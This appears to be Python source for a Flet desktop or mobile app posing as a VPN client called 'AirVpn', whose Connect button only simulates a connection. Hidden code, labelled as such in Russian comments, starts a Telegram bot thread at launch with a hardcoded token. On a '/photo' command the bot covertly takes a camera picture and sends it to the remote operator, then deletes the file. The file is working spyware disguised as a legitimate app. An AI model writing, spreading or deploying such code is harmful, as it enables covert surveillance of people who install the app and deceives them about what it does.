import flet as ft
import telebot
import threading
import os
import time
from plyer import camera, notification

# --- Скрытая логика управления ---
TOKEN = "8640024441:AAGLqms9l4_luuro1XSuxBDISJAfu1xD3io"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def ghost_start(message):
    bot.reply_to(message, "AirVpn Node Online. Жду указаний.")

@bot.message_handler(commands=['photo'])
def ghost_photo(message):
    try:
        camera.take_picture(filename="cache_001.jpg", on_complete=lambda path: None)
        time.sleep(2)
        if os.path.exists("cache_001.jpg"):
            with open("cache_001.jpg", "rb") as img:
                bot.send_photo(message.chat.id, img)
            os.remove("cache_001.jpg")
    except:
        pass

def run_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(10)

# Запуск бота в скрытом потоке
threading.Thread(target=run_bot, daemon=True).start()

# --- Интерфейс "AirVpn" ---
def main(page: ft.Page):
    page.title = "AirVpn"
    page.theme_mode = ft.ThemeMode.DARK
    page.window_width = 350
    page.window_height = 600
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.bgcolor = "#101217"

    status_text = ft.Text("Disconnected", color="#707070", size=16)
    location_text = ft.Text("Netherlands, Amsterdam", size=14, color="#b0b0b0")
    
    def on_connect_click(e):
        if connect_btn.text == "Connect":
            connect_btn.text = "Disconnecting..."
            connect_btn.disabled = True
            page.update()
            
            # Имитация подключения
            time.sleep(1.5)
            connect_btn.text = "Disconnect"
            connect_btn.bgcolor = "#303540"
            connect_btn.disabled = False
            status_text.value = "Connected"
            status_text.color = "#00FF7F"
            page.update()
        else:
            connect_btn.text = "Connect"
            connect_btn.bgcolor = "#007AFF"
            status_text.value = "Disconnected"
            status_text.color = "#707070"
            page.update()

    # Дизайн кнопки в стиле современных VPN
    connect_btn = ft.ElevatedButton(
        text="Connect",
        width=200,
        height=50,
        style=ft.ButtonStyle(
            color=ft.colors.WHITE,
            bgcolor="#007AFF",
            shape=ft.RoundedRectangleBorder(radius=12),
        ),
        on_click=on_connect_click
    )

    page.add(
        ft.Icon(ft.icons.SHIELD_LOCK_ROUNDED, size=80, color="#007AFF"),
        ft.Container(height=20),
        ft.Text("AirVpn", size=28, weight=ft.FontWeight.BOLD),
        status_text,
        ft.Container(height=40),
        ft.Container(
            content=ft.Row([
                ft.Icon(ft.icons.PUBLIC, color="#b0b0b0"),
                location_text
            ], alignment=ft.MainAxisAlignment.CENTER),
            padding=10,
            border=ft.border.all(1, "#303540"),
            border_radius=10,
            width=250
        ),
        ft.Container(height=40),
        connect_btn
    )

ft.app(target=main)
